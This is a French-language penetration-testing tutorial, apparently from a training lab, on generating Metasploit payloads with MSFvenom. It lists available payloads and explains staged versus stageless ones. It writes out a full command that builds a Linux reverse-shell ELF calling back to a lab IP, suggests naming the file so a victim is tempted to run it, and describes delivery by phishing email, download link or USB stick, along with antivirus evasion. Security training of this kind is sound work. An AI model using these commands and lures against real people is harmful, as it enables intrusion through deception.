# Fabriquer des Payloads avec MSFvenom

## Introduction 
Nous devons garder à l'esprit que l'utilisation d'attaques automatisées dans Metasploit nous oblige à atteindre une machine cible vulnérable sur le réseau. Considérez ce que nous avons fait dans la dernière section. Pour exécuter le module d'exploitation, fournir la charge utile et établir la session shell, nous devions d'abord communiquer avec le système. Cela peut avoir été possible grâce à une présence sur le réseau interne ou sur un réseau qui a des routes vers le réseau où réside la cible. Il y aura des situations où nous n'avons pas d'accès réseau direct à une machine cible vulnérable. Dans ces cas, nous devrons être astucieux dans la façon dont la charge utile est livrée et exécutée sur le système. L'un de ces moyens peut consister à utiliser MSFvenom pour créer une charge utile et l'envoyer par e-mail ou par d'autres moyens d'ingénierie sociale pour inciter cet utilisateur à exécuter le fichier.

En plus de fournir une charge utile avec des options de livraison flexibles, MSFvenom nous permet également de chiffrer et d'encoder les charges utiles pour contourner les signatures de détection antivirus courantes. Pratiquons un peu avec ces concepts.

## Pratiquer avec MSFvenom
Dans Pwnbox ou tout autre hôte sur lequel MSFvenom est installé, nous pouvons émettre la commande msfvenom -l payloads pour répertorier toutes les charges utiles disponibles. Vous trouverez ci-dessous quelques-unes des charges utiles disponibles. Quelques charges utiles ont été rédigées pour raccourcir la sortie et ne pas détourner l'attention de la leçon principale. Examinez attentivement les charges utiles et leurs descriptions:

### Lister les payloads
```
dsgsec@htb[/htb]$ msfvenom -l payloads

Framework Payloads (592 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
linux/x86/shell_find_port                           Spawn a shell on an established connection
linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
mainframe/shell_reverse_tcp                         Listen for a connection and spawn a  command shell. This implementation does not include ebcdic character translation, so a client wi
                                                        th translation capabilities is required. MSF handles this automatically.
multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP
multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS
netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller
library has been loaded. Based on work by Charlie Miller

windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop
                                                        /hop.php to the PHP server you wish to use as a hop.
windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)
```

Que remarquez-vous à propos de la sortie?

Nous pouvons voir quelques détails qui nous aideront à mieux comprendre les charges utiles. Tout d'abord, nous pouvons voir que la convention de nommage de la charge utile commence presque toujours par lister l'OS de la cible (Linux, Windows, MacOS, mainframe, etc...)Nous pouvons également voir que certaines charges utiles sont décrites comme (étagées) ou (sans étape). Couvrons la différence.

## Payload étagées ou sans étape
Les charges utiles étagées nous permettent d'envoyer plus de composants de notre attaque. Nous pouvons y penser comme si nous "préparions le terrain" pour quelque chose d'encore plus utile. Prenez par exemple cette charge utile linux/x86/shell/reverse_tcp. Lorsqu'elle est exécutée à l'aide d'un module d'exploit dans Metasploit, cette charge utile enverra une petite étape qui sera exécutée sur la cible, puis rappellera la boîte d'attaque pour télécharger le reste de la charge utile sur le réseau, puis exécute le shellcode pour établir un reverse coquille. Bien sûr, si nous utilisons Metasploit pour exécuter cette charge utile, nous devrons configurer des options pour pointer vers les adresses IP et le port appropriés afin que l'écouteur réussisse à attraper le shell. Gardez à l'esprit qu'une étape occupe également de l'espace en mémoire, ce qui laisse moins d'espace pour la charge utile. Ce qui se passe à chaque étape peut varier en fonction de la charge utile.

Les charges utiles sans étage n'ont pas d'étage. Prenez par exemple cette charge utile linux/zarch/meterpreter_reverse_tcp. À l'aide d'un module d'exploit dans Metasploit, cette charge utile sera envoyée dans son intégralité via une connexion réseau sans étape. Cela pourrait nous être bénéfique dans des environnements où nous n'avons pas accès à beaucoup de bande passante et où la latence peut interférer. Les charges utiles étagées peuvent entraîner des sessions shell instables dans ces environnements, il serait donc préférable de sélectionner une charge utile sans étape. En plus de cela, les charges utiles sans étape peuvent parfois être meilleures à des fins d'évasion en raison de moins de trafic passant sur le réseau pour exécuter la charge utile, surtout si nous la livrons en utilisant l'ingénierie sociale. Ce concept est également très bien expliqué par Rapid 7 dans cet article de blog sur les charges utiles Meterpreter sans étape.

Maintenant que nous comprenons les différences entre une charge utile étagée et sans étape, nous pouvons les identifier dans Metasploit. La réponse est simple. Le nom vous donnera votre premier marqueur. Prenez nos exemples ci-dessus, linux/x86/shell/reverse_tcp est une charge utile étagée, et nous pouvons le dire à partir du nom puisque chaque / dans son nom représente une étape à partir du shell. Donc /shell/ est une étape à envoyer, et /reverse_tcp en est une autre. Cela donnera l'impression que tout est pressé ensemble pour une charge utile sans étape. Prenons notre exemple linux/zarch/meterpreter_reverse_tcp. Il est similaire à la charge utile étagée sauf qu'il spécifie l'architecture qu'il affecte, puis il a la charge utile du shell et les communications réseau dans la même fonction /meterpreter_reverse_tcp. Pour un dernier exemple rapide de cette convention de nommage, considérons ces deux fenêtres/meterpreter/reverse_tcp et windows/meterpreter_reverse_tcp. Le premier est une charge utile mise en scène. Remarquez la convention de dénomination séparant les étapes. Ce dernier est une charge utile Stageless puisque nous voyons la charge utile du shell et la communication réseau dans la même partie du nom. Si le nom de la charge utile ne vous semble pas très clair, il précisera souvent si la charge utile est étagée ou sans étape dans la description.

## Construire un payload sans étape
Construisons maintenant une charge utile simple sans étape avec msfvenom et décomposons la commande.

### Payload
```
dsgsec@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

### Appelez MSFvenom
```
msfvenom
```
Définit l'outil utilisé pour créer la charge utile.

### Création d'une charge utile
```
-p
```

Cette option indique que msfvenom crée une charge utile.

### Choisir le payload en fonction de l'architecture
```
linux/x64/shell_reverse_tcp
```

Spécifie une charge utile sans étape Linux 64 bits qui lancera un shell inverse basé sur TCP (shell_reverse_tcp).

### Adresse à laquelle se reconnecter
```
LHOST=10.10.14.113 LPORT=443
```
Une fois exécutée, la charge utile rappellera l'adresse IP spécifiée (10.10.14.113) sur le port spécifié (443)

### Format
```
-f elf
```

L'indicateur -f spécifie le format dans lequel le binaire généré sera. Dans ce cas, ce sera un fichier .elf.

### Output
```
> createbackup.elf
```

Crée le binaire .elf et nomme le fichier createbackup. Nous pouvons nommer ce fichier comme nous voulons. Idéalement, nous appellerions cela quelque chose de discret et/ou quelque chose que quelqu'un serait tenté de télécharger et d'exécuter.

## Executer un "Stageless Payload"

À ce stade, nous avons la charge utile créée sur notre boîte d'attaque. Nous aurions maintenant besoin de développer un moyen d'obtenir cette charge utile sur le système cible. Il existe d'innombrables façons de le faire. Voici quelques-unes des méthodes courantes:

+ Message électronique avec le fichier joint.
+ Lien de téléchargement sur un site Web.
+ Combiné avec un module d'exploit Metasploit (cela nous obligerait probablement à être déjà sur le réseau interne).
+ Via un lecteur flash dans le cadre d'un test de pénétration sur site.
+ Une fois que le fichier est sur ce système, il devra également être exécuté.

Imaginez un instant: 
la machine cible est une boîte Ubuntu qu'un administrateur informatique utilise pour gérer les périphériques réseau (hébergement des scripts de configuration, accès aux routeurs et commutateurs, etc.). Nous pouvions les amener à cliquer sur le fichier dans un e-mail que nous envoyions parce qu'ils utilisaient ce système avec négligence comme s'il s'agissait d'un ordinateur personnel ou d'un poste de travail.
